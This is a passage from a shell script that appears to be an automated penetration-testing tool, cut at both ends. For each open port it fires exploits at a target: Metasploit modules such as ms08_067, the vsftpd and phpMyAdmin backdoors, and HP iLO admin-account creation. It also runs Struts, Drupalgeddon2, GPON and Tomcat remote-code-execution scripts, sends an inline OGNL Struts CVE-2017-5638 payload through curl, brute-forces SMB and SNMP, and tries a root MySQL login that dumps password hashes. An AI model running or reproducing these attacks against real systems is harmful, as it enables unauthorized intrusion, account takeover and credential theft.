    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET | head -n 1
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    ruby $INSTALL_DIR/bin/drupalgeddon2.rb http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/cisco-asa-traversal.py http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JEXBOSS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd /tmp/
    python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/gpon_rce.py http://$TARGET:$PORT 'whoami'
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u http://$TARGET
  fi

  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
    if [ $OSINT == "0" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
    else
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      goohak $TARGET > /dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
    rm -Rf output/ cookie.txt exploits.conf
    GHDB="1"
  fi
fi

if [ -z "$port_110" ];
then
  echo -e "$OKRED + -- --=[Port 110 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 110 opened... running tests...$RESET"
  nmap -A -sV  -T5 --script=pop* -p 110 $TARGET
fi

if [ -z "$port_111" ];
then
  echo -e "$OKRED + -- --=[Port 111 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 111 opened... running tests...$RESET"
  msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;"
  showmount -a $TARGET
  showmount -d $TARGET
  showmount -e $TARGET
fi

if [ -z "$port_123" ];
then
  echo -e "$OKRED + -- --=[Port 123 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 123 opened... running tests...$RESET"
  nmap -A -sU -sV -Pn -T5 --script=ntp-* -p 123 $TARGET
fi

if [ -z "$port_135" ];
then
  echo -e "$OKRED + -- --=[Port 135 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 135 opened... running tests...$RESET"
  rpcinfo -p $TARGET
  nmap -A -p 135 -T5 --script=rpc* $TARGET
  msfconsole -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;"
fi

if [ -z "$port_137" ];
then
  echo -e "$OKRED + -- --=[Port 137 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 137 opened... running tests...$RESET"
  rpcinfo -p $TARGET
  nmap -A -p 137 -T5 --script=broadcast-netbios-master-browser* $TARGET
  msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;"
fi

if [ -z "$port_139" ];
then
  echo -e "$OKRED + -- --=[Port 139 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
  SMB="1"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  enum4linux $TARGET
  python $SAMRDUMP $TARGET
  nbtscan $TARGET
  nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
  msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
fi

if [ -z "$port_161" ];
then
  echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET
  msfconsole -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_162" ];
then
  echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET
  msfconsole -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_389" ];
then
  echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
  nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET
fi

if [ -z "$port_443" ];
then
  echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING FOR WAF $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wafw00f https://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-https 2> /dev/null
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-https > $LOOT_DIR/web/waf-$TARGET-https.txt 2> /dev/null
  echo ""
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED GATHERING HTTP INFO $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  whatweb -a 3 https://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-https  2> /dev/null
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-https > $LOOT_DIR/web/whatweb-$TARGET-https.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED GATHERING SERVER INFO $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
  curl --connect-timeout 3 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET | tee $LOOT_DIR/web/sslyze-$TARGET.txt 2> /dev/null
  sslscan --no-failed $TARGET | tee $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET.raw > $LOOT_DIR/web/sslscan-$TARGET.txt 2> /dev/null
  echo ""
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"

  if [ "$MODE" = "web" ];
  then
    if [ "$PASSIVE_SPIDER" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
    fi

    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u https://$TARGET -l 3 -s y -v y
      cat /usr/share/blackwidow/$TARGET/$TARGET-urls-sorted.txt >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget https://$TARGET:$PORT/robots.txt -O $LOOT_DIR/web/robots-$TARGET:$PORT-https.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -T5 -Pn -p 443 --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd --ssl -i $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wpscan --url https://$TARGET --batch --disable-tls-checks
    echo ""
    wpscan --url https://$TARGET/wordpress/ --batch --disable-tls-checks
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CMSMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET
    echo ""
    python $CMSMAP -t https://$TARGET/wordpress/
    echo ""
    if [ "$NIKTO" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h https://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-https.txt
    fi
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "443"; setg SSL true; run; use scanner/http/webdav_website_content; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 443; set SSL true; set WAIT 2; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2018-11776 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache-struts-CVE-2018-11776.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    ruby $INSTALL_DIR/bin/drupalgeddon2.rb https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/cisco-asa-traversal.py https://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JEXBOSS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd /tmp/
    python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/gpon_rce.py https://$TARGET:$PORT 'whoami'
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u https://$TARGET

  fi

  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
    if [ -z $GHDB ]; then
      if [ $OSINT == "0" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
      else
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        goohak $TARGET > /dev/null
      fi
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
      rm -Rf output/ cookie.txt exploits.conf
    fi
  fi
fi

if [ -z "$port_445" ];
then
  echo -e "$OKRED + -- --=[Port 445 closed... skipping.$RESET"
elif [ $SMB = "1" ];
then
  echo -e "$OKRED + -- --=[Port 445 scanned... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 445 opened... running tests...$RESET"
  enum4linux $TARGET
  python $SAMRDUMP $TARGET
  nbtscan $TARGET
  nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
  






  msfconsole -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
fi

if [ -z "$port_512" ];
then
  echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET
fi

if [ -z "$port_513" ]
then
  echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
  nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET
fi

if [ -z "$port_514" ];
then
  echo -e "$OKRED + -- --=[Port 514 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
  amap $TARGET 514 -A
fi

if [ -z "$port_623" ];
then
  echo -e "$OKRED + -- --=[Port 623 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
  amap $TARGET 623 -A
  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
fi

if [ -z "$port_624" ];
then
  echo -e "$OKRED + -- --=[Port 624 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
  amap $TARGET 624 -A
  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
fi

if [ -z "$port_1099" ];
then
  echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
  amap $TARGET 1099 -A
  nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET
  msfconsole -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
  msfconsole -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
fi

if [ -z "$port_1433" ];
then
  echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET
fi

if [ -z "$port_2049" ];
then
  echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET
  rpcinfo -p $TARGET
  showmount -e $TARGET
  smbclient -L $TARGET -U " "%" "
fi

if [ -z "$port_2121" ];
then
  echo -e "$OKRED + -- --=[Port 2121 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 2121 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=ftp* -p 2121 $TARGET
  msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
fi

if [ -z "$port_3306" ];
then
  echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
  nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET
  msfconsole -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;"
  mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
fi

if [ -z "$port_3310" ];
then
  echo -e "$OKRED + -- --=[Port 3310 closed... skipping.$RESET"
else
